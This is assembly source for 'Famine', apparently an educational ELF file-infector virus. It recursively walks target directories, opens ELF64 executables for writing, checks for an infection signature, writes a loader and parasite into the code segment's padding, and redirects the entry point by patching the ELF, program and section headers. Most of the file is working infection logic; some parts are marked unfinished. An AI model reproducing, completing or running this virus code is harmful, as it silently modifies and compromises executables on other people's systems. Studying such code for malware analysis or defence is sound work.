BITS 64

global _famine

section .text

;-----------;
; CONSTANTS ;
;-----------;

; struct s_famine
TARGETS_OFF equ 0
SIGNATURESZ_OFF equ TARGETS_OFF + 8
LOADERSZ_OFF equ SIGNATURESZ_OFF + 8
PARASITESZ_OFF equ LOADERSZ_OFF + 8
PAYLOAD_CODE_OFF equ PARASITESZ_OFF + 8
LOADER_ORIGINAL_ENTRY_OFF equ 48
LOADER_ISPIE_OFF equ LOADER_ORIGINAL_ENTRY_OFF + 1
; dirent
DIRENT_STRUCTSZ equ 4096
DIRENT_DIR_TYPE equ 4
D_RECLEN_OFF equ 16
D_NAME_OFF equ 19
; stat
STAT_STRUCTSZ equ 144
AT_FDCWD equ 0xffffff9c
ST_MODE_OFF equ 24
ST_SIZE_OFF equ 48
S_IFMT equ 0o170000
S_IFDIR equ 0o040000
S_IFREG equ 0o100000
; elf
ELF64_EHDR_SIZE equ 64
ELF_MAGIC equ 0x464c457f
EI_CLASS_OFF equ 4
ELFCLASS32 equ 1
ELFCLASS64 equ 2
E_TYPE_OFF equ 16
ET_EXEC equ 2
ET_DYN equ 3
E_ENTRY_OFF equ 24
E_PHOFF_OFF equ 32
E_SHOFF_OFF equ 40
E_PHENTSIZE_OFF equ 54
E_PHNUM_OFF equ 56
E_SHENTSIZE_OFF equ 58
E_SHNUM_OFF equ 60
P_FLAGS_OFF equ 4
PT_LOAD equ 1
PF_X equ 1
PF_W equ 2
PF_R equ 4
P_OFFSET_OFF equ 8
P_VADDR_OFF equ 16
P_FILESZ_OFF equ 32
P_MEMSZ_OFF equ 40
SH_OFFSET_OFF equ 24
SH_SIZE_OFF equ 32
; open
O_RDWR equ 02


; void _famine(struct s_famine *famine);
_famine:
    push rbp
    mov rbp, rsp
    sub rsp, 8
    mov qword [rbp - 8], rdi

    ; set target index to 0
    xor rcx, rcx

.loop_targets:
    ; rdi = targets[rcx >> 3]
    mov rdi, qword [rbp - 8]
    mov rdi, qword [rdi]
    add rdi, rcx
    mov rdi, qword [rdi]

    ; return if rdi is 0
    test rdi, rdi
    jz .return

    push rcx
    mov rsi, qword [rbp - 8]
    call _read_dir_recursive
    pop rcx

    ; increment actual index
    shr rcx, 3
    inc rcx
    ; get byte offset to nex target
    shl rcx, 3

    jmp .loop_targets

.return:
    add rsp, 8
    leave
    ret


BASE_STACK_OFF equ 8
TARGET_DIR_OFF equ BASE_STACK_OFF + 8
FAMINE_STRUCT_OFF equ TARGET_DIR_OFF + 8
DIR_FD_OFF equ FAMINE_STRUCT_OFF + 4
DIR_READ_BYTES_OFF equ DIR_FD_OFF + 8
DIRENT_BUFF_OFF equ DIR_READ_BYTES_OFF + DIRENT_STRUCTSZ
JOINED_PATH_OFF equ DIRENT_BUFF_OFF + 8
STAT_STRUCT_OFF equ JOINED_PATH_OFF + STAT_STRUCTSZ
READ_DIR_RECURSIVE_ALLOC equ STAT_STRUCT_OFF

; rdi: absolute path to target directory.
; rsi: address to s_famine struct.
_read_dir_recursive:
    push rbp
    mov rbp, rsp
    push rbx
    sub rsp, READ_DIR_RECURSIVE_ALLOC

    ; save path of current dir
    mov qword [rbp - TARGET_DIR_OFF], rdi
    mov qword [rbp - FAMINE_STRUCT_OFF], rsi

    ; open directory
    xor rdx, rdx        ;
    mov rsi, rdi        ; openat(AT_FDCWD, path, 0);
    mov rdi, AT_FDCWD   ;
    call _openat
    cmp rax, 0
    jl .return

    ; save directory fd
    mov dword [rbp - DIR_FD_OFF], eax

.get_directory_content:
    ; read directory's content
    mov rdx, DIRENT_STRUCTSZ          ;
    lea rsi, [rbp - DIRENT_BUFF_OFF]  ; getdents64(dir_fd, dirent_buff, sizeof(struct dirent));
    mov edi, dword [rbp - DIR_FD_OFF] ;
    call _getdents64
    cmp rax, 0
    jle .cleanup

    ; save read bytes
    mov qword [rbp - DIR_READ_BYTES_OFF], rax
    lea rbx, [rbp - DIRENT_BUFF_OFF]
    xor rcx, rcx

; parse directory's content
.parse_dir_loop:
    push rcx

    ; check if d_name is not 0
    mov cl, byte [rbx + D_NAME_OFF]
    test cl, cl
    jz .inc_parse_loop

    ; skip if entry == .
    lea rsi, [rbx + D_NAME_OFF]
    lea rdi, [rel CURR_DIR]
    call _ft_strcmp
    test rax, rax
    jz .inc_parse_loop

    ; skip if entry == ..
    lea rsi, [rbx + D_NAME_OFF]
    lea rdi, [rel PARENT_DIR]
    call _ft_strcmp
    test rax, rax
    jz .inc_parse_loop

    ; create entry's absolute path
    mov dl, '/'
    lea rsi, [rbx + D_NAME_OFF]
    mov rdi, qword [rbp - TARGET_DIR_OFF]
    call _ft_strjoin_by
    test rax, rax
    jz .inc_parse_loop
    ; save returned address
    mov qword [rbp - JOINED_PATH_OFF], rax

    ; preform stat(3)
    lea rsi, qword [rbp - STAT_STRUCT_OFF]
    mov rdi, rax
    call _stat
    cmp rax, 0
    jl .done_with_path

    ; get entry's file type
    xor rax, rax
    mov eax, dword [rbp - STAT_STRUCT_OFF + ST_MODE_OFF]
    and rax, S_IFMT
    ; check if entry is dir
    cmp rax, S_IFDIR
    je .handle_dir
    ; check if entry is a regular file
    cmp rax, S_IFREG
    je .handle_file
    ; mode not supported
    jmp .done_with_path

.handle_dir:
    mov rdi, qword [rbp - JOINED_PATH_OFF]
    mov rsi, qword [rbp - FAMINE_STRUCT_OFF]
    call _read_dir_recursive
    jmp .done_with_path

.handle_file:
    ; call function which will handle the file
    mov rdx, qword [rbp - FAMINE_STRUCT_OFF]
    mov esi, dword [rbp - STAT_STRUCT_OFF + ST_SIZE_OFF]
    mov rdi, qword [rbp - JOINED_PATH_OFF]
    call _handle_file
    jmp .done_with_path

.done_with_path:
    ; unmap heap memory used to store path to file
    mov rdi, qword [rbp - JOINED_PATH_OFF]
    call _ft_strlen
    mov rsi, rax
    inc rsi
    mov rdi, qword [rbp - JOINED_PATH_OFF]
    call _munmap

.inc_parse_loop:
    ; move to next entry
    pop rcx
    add cx, word [rbx + D_RECLEN_OFF]
    add bx, word [rbx + D_RECLEN_OFF]
    ; return if done parsing
    cmp rcx, qword [rbp - DIR_READ_BYTES_OFF]
    jl .parse_dir_loop
    jmp .get_directory_content

.cleanup:
    ; close directory fd
    mov edi, dword [rbp - DIR_FD_OFF]
    call _close

.return:
    add rsp, READ_DIR_RECURSIVE_ALLOC
    pop rbx
    leave
    ret


FILESZ_OFF equ 4
S_FAMINE_OFF equ FILESZ_OFF + 8
FILE_FD_OFF equ S_FAMINE_OFF + 4
ELF_HEADER_OFF equ FILE_FD_OFF + 64
HANDLE_FILE_ALLOC equ ELF_HEADER_OFF

; void _handle_file(char *path, uint32_t filesz, struct s_famine *struct);
_handle_file:
    push rbp
    mov rbp, rsp
    sub rsp, HANDLE_FILE_ALLOC

    mov dword [rbp - FILESZ_OFF], esi
    mov qword [rbp - S_FAMINE_OFF], rdx

    ; open file
    mov rsi, O_RDWR
    call _open
    cmp rax, 0
    jl .return
    ; save fd
    mov dword [rbp - FILE_FD_OFF], eax

    ; read elf header (first 64 bytes of the file)
    mov rdx, ELF64_EHDR_SIZE
    lea rsi, [rbp - ELF_HEADER_OFF]
    mov rdi, rax
    call _read
    cmp rax, ELF64_EHDR_SIZE
    jl .cleanup

    ; check elf magic number
    mov eax, dword [rbp - ELF_HEADER_OFF]
    cmp eax, ELF_MAGIC
    jne .cleanup

    ; check elf type
    movzx rax, word [rbp - ELF_HEADER_OFF + E_TYPE_OFF]
    cmp rax, ET_EXEC
    jl .cleanup
    cmp rax, ET_DYN
    jg .cleanup

    ; check elf arch
    movzx rax, byte [rbp - ELF_HEADER_OFF + EI_CLASS_OFF]
    cmp rax, ELFCLASS32
    je .handle_elf32
    cmp rax, ELFCLASS64
    je .handle_elf64
    ; elf arch is not supported
    jmp .cleanup

    ; TODO: check header sizes
    ;movzx rax, word [rbp - ELF_HEADER_OFF + E_PHENTSIZE_OFF]
    ;movzx rdx, word [rbp - ELF_HEADER_OFF + E_PHNUM_OFF]
    ;imul rcx, rax, rdx

.handle_elf64:
    ; perform infection
    mov rsi, qword [rbp - S_FAMINE_OFF] ;
    mov edi, dword [rbp - FILE_FD_OFF]  ; _elf64_infector(fd, struct)
    call _elf64_infector                ;
    test rax, rax
    jnz .exec_binary
    jmp .cleanup

.handle_elf32:
    ; TODO: handle 32 bit

.exec_binary:
    ; TODO: exec binary

.cleanup:
    ; close file fd
    mov edi, dword [rbp - FILE_FD_OFF]
    call _close

.return:
    add rsp, HANDLE_FILE_ALLOC
    leave
    ret


BUFFSZ equ 4096
TARGET_FD_OFF equ 4
PAYLOAD_OFF equ TARGET_FD_OFF + 8
BUFF_OFF equ PAYLOAD_OFF + BUFFSZ
INJECTION_OFF equ BUFF_OFF + 8
INJECTION_ADDR_OFF equ INJECTION_OFF + 8
ORIGINAL_ENTRY_OFF equ INJECTION_ADDR_OFF + 8
PAYLOADSZ_OFF equ ORIGINAL_ENTRY_OFF + 8
SHOFF_OFF equ PAYLOADSZ_OFF + 8
SHENTSIZE_OFF equ SHOFF_OFF + 8
SHNUM_OFF equ SHENTSIZE_OFF + 2
ELF64_INFECTOR_ALLOC equ SHNUM_OFF

; void _elf64_infector(int fd, struct s_famine *struct);
_elf64_infector:
    push rbp
    mov rbp, rsp
    sub rsp, ELF64_INFECTOR_ALLOC

    ; save fd
    mov dword [rbp - TARGET_FD_OFF], edi
    mov qword [rbp - PAYLOAD_OFF], rsi

    ; reset file pointer to the beginning of the file
    xor rdx, rdx
    xor rsi, rsi
    call _lseek
    cmp rax, 0
    jl .no_injection

    ; read 1024 bytes of data (hopefully all the program headers)
    ; TODO: read the exact amount of data: elf_ehdr + all phdr + sizeof(phdr)
    mov rdx, 1024
    lea rsi, qword [rbp - BUFF_OFF]
    mov edi, dword [rbp - TARGET_FD_OFF]
    call _read
    cmp rax, 0
    jl .no_injection

    ; r11 will now become the iterator for program headers
    lea r11, qword [rbp - BUFF_OFF]
    add r11, qword [rbp - BUFF_OFF + E_PHOFF_OFF]
    xor r10, r10

    ; TODO: inject signature into data segment instead of code segment

.prepare_code_segment_loop:
    mov rdx, PF_R
    or rdx, PF_X

.find_code_segment_loop:
    ; check program header type
    cmp dword [r11], PT_LOAD  ; program_header->p_type == PT_LOAD
    jne .inc_code_segment_loop
    ; check program header flags
    cmp edx, dword [r11 + P_FLAGS_OFF] ; program_header->p_flags == (PF_R | PF_X)
    je .code_segment_found

.inc_code_segment_loop:
    add r11w, word [rbp - BUFF_OFF + E_PHENTSIZE_OFF]
    inc r10
    cmp r10w, word [rbp - BUFF_OFF + E_PHNUM_OFF]
    jnl .no_injection
    jmp .find_code_segment_loop

.code_segment_found:
    ; check for signature
    push r10
    push r11
    mov rdx, qword [rbp - PAYLOAD_OFF]
    mov rsi, r11
    mov edi, dword [rbp - TARGET_FD_OFF]
    call _is_file_target
    pop r11
    pop r10
    cmp rax, 0
    jbe .no_injection ; file is already signed or there was an error, so we just leave

    cmp r10w, word [rbp - BUFF_OFF + E_PHNUM_OFF] ; elf_header->e_phnum
    ; TODO: handle case where code segment in the last segment
    ; -> the padding is between the end of the segment and the end of the file
    jnl .no_injection

    ; calculate injection offset
    mov rax, qword [r11 + P_OFFSET_OFF] ; rax = program_header->p_offset
    add rax, qword [r11 + P_FILESZ_OFF] ; rax += program_header->p_filesz
    mov qword [rbp - INJECTION_OFF], rax

    ; calculate injection address
    mov rax, qword [r11 + P_VADDR_OFF]  ; rax = program_header->p_vaddr
    add rax, qword [r11 + P_FILESZ_OFF] ; rax += program_header->p_filesz
    mov qword [rbp - INJECTION_ADDR_OFF], rax

    ; calculate padding size
    movzx rdx, word [rbp - BUFF_OFF + E_PHENTSIZE_OFF] ; rdx = elf_header->e_phentsize
    mov rdx, qword [r11 + rdx + P_OFFSET_OFF] ; rdx = next_header->p_offset
    sub rdx, qword [rbp - INJECTION_OFF] ; padding = next_header_off - (curr_header_off + header_size)

    ; calculate total payload size
    push rdx
    mov rdx, qword [rbp - PAYLOAD_OFF]
    mov rax, qword [rdx + SIGNATURESZ_OFF] ; rax = s_famine->signaturesz
    add rax, qword [rdx + LOADERSZ_OFF]    ; rax += s_famine->loadersz
    add rax, qword [rdx + PARASITESZ_OFF]  ; rax += s_famine->parasitesz
    mov qword [rbp - PAYLOADSZ_OFF], rax
    pop rdx

    ; check if payload fits right away
    cmp rax, rdx
    jle .patch_elf_entrypoint

    ; TODO: handle case where padding is too small -> compression, add segment
    jmp .no_injection

.patch_elf_entrypoint:
    mov r10, qword [rbp - PAYLOAD_OFF]     ; r10 = s_famine
    mov r9, qword [r10 + SIGNATURESZ_OFF]  ; r9 = s_famine->signaturesz
    mov r8, qword [r10 + LOADERSZ_OFF]     ; r8 = s_famine->loadersz
    lea rax, [r10 + PAYLOAD_CODE_OFF + r9]
    add rax, r8
    mov r8, rax
    ; patch original entrypoint in loader
    sub rax, LOADER_ORIGINAL_ENTRY_OFF     ; rax = off to loader original entry label
    mov rdx, qword [rbp - BUFF_OFF + E_ENTRY_OFF]
    mov qword [rax], rdx

    sub r8, LOADER_ISPIE_OFF

    ; file is of type ET_EXEC
    cmp word [rbp - BUFF_OFF + E_TYPE_OFF], ET_EXEC
    je .entry_is_addr
    ; if file is of type ET_DYN -> INJECTION_OFF
    mov rdx, qword [rbp - INJECTION_OFF]

.patch_loader_ispie:
    mov byte [r8], 1
    jmp .write_elf_header

.entry_is_addr:
    mov byte [r8], 0
    mov rdx, qword [rbp - INJECTION_ADDR_OFF]

.write_elf_header:
    ; rdx contains the address/offset to the start of the paylaod
    ; but the first element is the signature, so we need to skip it.
    add rdx, r9
    ; patch file's actual entry point
    mov qword [rbp - BUFF_OFF + E_ENTRY_OFF], rdx

    ; write changes in elf header to disk
    push r11
    mov rcx, 8
    lea rdx, [rbp - BUFF_OFF + E_ENTRY_OFF]
    mov rsi, E_ENTRY_OFF
    mov edi, dword [rbp - TARGET_FD_OFF]
    call _write_at_offset
    pop r11

.patch_program_headers:
    ; program_header->p_flags |= PF_W
    ;mov dword [r11 + 4], 7

    ; program_header->p_filesz += payload_size
    mov rax, qword [r11 + P_FILESZ_OFF]
    add rax, qword [rbp - PAYLOADSZ_OFF]
    mov qword [r11 + P_FILESZ_OFF], rax

    ; program_header->p_memsz += payload_size
    mov rax, qword [r11 + P_MEMSZ_OFF]
    add rax, qword [rbp - PAYLOADSZ_OFF]
    mov qword [r11 + P_MEMSZ_OFF], rax

    ; write changes to disk
    lea rdx, [r11 + P_FILESZ_OFF]
    lea rcx, [rbp - BUFF_OFF]
    mov rsi, rdx
    sub rsi, rcx
    mov rcx, 16
    mov edi, dword [rbp - TARGET_FD_OFF]
    call _write_at_offset

.prepare_to_parse_section_headers:
    ; save important values for the future
    mov rax, qword [rbp - BUFF_OFF + E_SHOFF_OFF]
    mov qword [rbp - SHOFF_OFF], rax
    mov ax, word [rbp - BUFF_OFF + E_SHNUM_OFF]
    mov word [rbp - SHNUM_OFF], ax
    movzx rax, word [rbp - BUFF_OFF + E_SHENTSIZE_OFF]
    mov qword [rbp - SHENTSIZE_OFF], rax

    ; section headers are too far away into the file
    ; so, we read from the first section header.
    movzx rcx, word [rbp - BUFF_OFF + E_SHNUM_OFF]
    mul rcx
    mov rcx, rax
    lea rdx, [rbp - BUFF_OFF]
    mov rsi, qword [rbp - BUFF_OFF + E_SHOFF_OFF]
    mov edi, dword [rbp - TARGET_FD_OFF]
    call _read_at_offset
    test rax, rax
    jz .no_injection

    ; setup for section header checks
    xor r10, r10
    lea rcx, [rbp - BUFF_OFF]
    mov r11, rcx

.find_section_header:
    mov rax, qword [r11 + SH_OFFSET_OFF]
    add rax, qword [r11 + SH_SIZE_OFF]
    cmp rax, qword [rbp - INJECTION_OFF]
    je .patch_section_header

    add r11w, word [rbp - SHENTSIZE_OFF]
    inc r10
    cmp r10w, word [rbp - SHNUM_OFF]
    jnl .inject_payload
    jmp .find_section_header

.patch_section_header:
    ; section_header->sh_size += signature_size;
    mov rax, qword [r11 + SH_SIZE_OFF]
    add rax, qword [rbp - PAYLOADSZ_OFF]
    mov qword [r11 + SH_SIZE_OFF], rax

    ; write changes to disk
    lea rdx, [r11 + SH_SIZE_OFF]
    mov rsi, rdx
    sub rsi, rcx
    add rsi, [rbp - SHOFF_OFF] ; rsi = rdx - rcx + e_shoff
    mov rcx, 8
    mov edi, dword [rbp - TARGET_FD_OFF]
    ; _write_at_offset(fd, &(section_header->sh_size), r11 + SH_SIZE_OFF, 8)
    call _write_at_offset

.inject_payload:
    mov rcx, qword [rbp - PAYLOADSZ_OFF]
    mov rdx, qword [rbp - PAYLOAD_OFF]
    add rdx, PAYLOAD_CODE_OFF
    mov rsi, qword [rbp - INJECTION_OFF]
    mov edi, dword [rbp - TARGET_FD_OFF]
    call _write_at_offset
    mov rax, 1
    jmp .return

.no_injection:
    xor rax, rax

.return:
    add rsp, ELF64_INFECTOR_ALLOC
    leave
    ret


; bool _is_file_target(int fd, Elf64_Phdr *header, struct famine *struct)
_is_file_target:
    push rbp
    mov rbp, rsp
    sub rsp, 84

    mov dword [rbp - 4], edi
    mov qword [rbp - 12], rsi
    mov qword [rbp - 20], rdx

    mov rax, qword [rsi + P_FILESZ_OFF]
    sub rax, qword [rdx + PARASITESZ_OFF]
    sub rax, qword [rdx + LOADERSZ_OFF]
    sub rax, qword [rdx + SIGNATURESZ_OFF]
    ; rax is the segment size without the added payload
    mov r11, rax

    mov r10, qword [rbp - 20] ; r10 = struct

    ; read from fd at possible signature off
    mov rcx, qword [r10 + SIGNATURESZ_OFF]
    lea rdx, [rbp - 84]
    mov rsi, qword [rbp - 12]           ;
    mov rsi, qword [rsi + P_OFFSET_OFF] ; rsi = header->p_offset
    add rsi, r11                        ; rsi += signature off
    mov edi, dword [rbp - 4]
    call _read_at_offset
    test rax, rax
    jz .error

    ; compare 2 signatures
    lea rsi, [r10 + PAYLOAD_CODE_OFF]
    lea rdi, [rbp - 84]
    call _ft_strcmp

    jmp .return

.error:
    mov rax, -1

.return:
    add rsp, 84
    leave
    ret


; write_at_offset(uint32_t fd, uint64_t offset, uint64_t data, uint32_t size);
_write_at_offset:
    push rbp
    mov rbp, rsp

    sub rsp, 32
    mov qword [rbp - 8], rsi
    mov qword [rbp - 16], rdx
    mov dword [rbp - 24], edi
    mov dword [rbp - 28], ecx

    ; reset file pointer to offset
    xor rdx, rdx
    call _lseek
    cmp rax, 0
    jl .return

    ; write data in file at offset
    mov edx, dword [rbp - 28]
    mov rsi, qword [rbp - 16]
    mov edi, dword [rbp - 24]
    call _write

.return:
    add rsp, 32
    leave
    ret


; read_at_offset(uint32_t fd, uint64_t offset, uint64_t buff, uint32_t size);
_read_at_offset:
    push rbp
    mov rbp, rsp

    sub rsp, 32
    mov qword [rbp - 8], rsi
    mov qword [rbp - 16], rdx
    mov dword [rbp - 24], edi
    mov dword [rbp - 28], ecx

    ; reset file pointer to offset
    xor rdx, rdx
    call _lseek
    cmp rax, 0
    jl .error

    mov edx, dword [rbp - 28]
    mov rsi, qword [rbp - 16]
    mov edi, dword [rbp - 24]
    call _read
    cmp rax, 0
    jl .error

    jmp .success

.error:
    xor rax, rax
    jmp .return

.success:
    mov rax, 1

.return:
    add rsp, 32
    leave
    ret


;-----------------;
; LIBFT FUNCTIONS ;
;-----------------;

; int ft_strcmp(*s1, *s2);
_ft_strcmp:
    xor rax, rax
    xor rcx, rcx
.loop:
    mov al, byte [rdi + rcx]
    mov dl, byte [rsi + rcx]
    test al, al
    jz .return
    test dl, dl
    jz .return
    cmp al, dl
    jne .return
    inc rcx
    jmp .loop
.return:
    sub al, dl
    ret


; char *ft_strcpy(char *dest, const char *src);
_ft_strcpy:
    push rdi
    cld
.copy_loop:
    lodsb
    stosb
    test al, al
    jnz .copy_loop
    pop rax
    ret


; size_t ft_strlen(const char *s);
_ft_strlen:
    xor rax, rax
    mov rsi, rdi
    mov rcx, -1
    cld
    repne scasb
    mov rax, rcx
    not rax
    dec rax
    ret


S1_OFF equ 8
S2_OFF equ 16
C_OFF equ 29
RET_OFF equ 24
S1_LEN_OFF equ 28

; char *strjoin(const *char s1, const char *s2, char c);
_ft_strjoin_by:
    push rbp
    mov rbp, rsp

    sub rsp, 32
    mov qword [rbp - S1_OFF], rdi
    mov qword [rbp - S2_OFF], rsi
    mov byte [rbp - C_OFF], dl

    ; get length of both strings
    call _ft_strlen
    mov dword [rbp - S1_LEN_OFF], eax

    mov rdi, [rbp - S2_OFF]
    call _ft_strlen
    add eax, dword [rbp - S1_LEN_OFF]
    inc rax

    ; allocate memory
    xor r9, r9         ;
    mov r8, -1         ;
    mov r10, 0x22      ; mmap(0, rax, PROT_READ | PROT_WRITE,
    mov edx, 3         ;      MAP_PRIVATE, -1, 0);
    mov rsi, rax       ;
    xor rdi, rdi       ;
    call _mmap
    cmp rax, 0
    jl .error

    mov qword [rbp - RET_OFF], rax

    ; copy strings
    mov rsi, [rbp - S1_OFF]  ;
    mov rdi, rax             ; ft_strcpy(rax: memory space allocate with mmap,
    call _ft_strcpy          ;           s1)

    ; prepare for second strcpy call
    mov rdi, [rbp - RET_OFF]
    mov ecx, dword [rbp - S1_LEN_OFF]
    add rdi, rcx
    ; place the joint character
    mov al, byte [rbp - C_OFF]
    mov byte [rdi], al
    inc rdi

    mov rsi, [rbp - S2_OFF]  ; ft_strcpy(mmap_space + strlen(s1), s2)
    call _ft_strcpy          ;

    mov rax, [rbp - RET_OFF]
    jmp .return

.error:
    xor rax, rax

.return:
    add rsp, 32
    leave
    ret


;-------------------;
; SYSCALL FUNCTIONS ;
;-------------------;

_read:
    xor rax, rax
    syscall
    ret

_write:
    mov rax, 1
    syscall
    ret

_open:
    mov rax, 2
    syscall
    ret

_close:
    mov rax, 3
    syscall
    ret

_stat:
    mov rax, 4
    syscall
    ret

_lseek:
    mov rax, 8
    syscall
    ret

_mmap:
    mov rax, 9
    syscall
    ret

_munmap:
    mov rax, 11
    syscall
    ret

_getdents64:
    mov rax, 217
    syscall
    ret

_openat:
    mov rax, 257
    syscall
    ret

CURR_DIR db ".",0
PARENT_DIR db "..",0
